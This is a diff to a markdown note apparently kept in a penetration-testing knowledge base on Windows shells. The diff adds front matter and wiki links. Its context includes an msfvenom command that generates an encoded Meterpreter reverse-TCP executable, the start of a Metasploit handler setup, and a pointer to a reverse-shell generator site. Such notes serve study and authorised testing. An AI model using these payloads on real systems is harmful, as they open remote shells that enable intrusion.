@@ -1,3 +1,10 @@
+---
+title: "Windows Shells"
+created: 2026-03-11
+type: technique
+tags: [linux, shells, technique, windows]
+---
+
 The following repository contains some scripts for initial access, enumeration and privilege escalation.
 
 ```
@@ -22,14 +29,14 @@ or we could simply use powershell encoded reverse shell or any other shell from 
 https://www.revshells.com/
 ```
 
-# Meterpreter Shell
+# [[Meterpreter]] Shell
 To generate a x86 meterpreter encoded reverse shell we could use the following command:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe
 ```
 
-Then, we start a handler on Metasploit:
+Then, we start a handler on [[Metasploit]]:
 
 ```
 use exploit/multi/handler
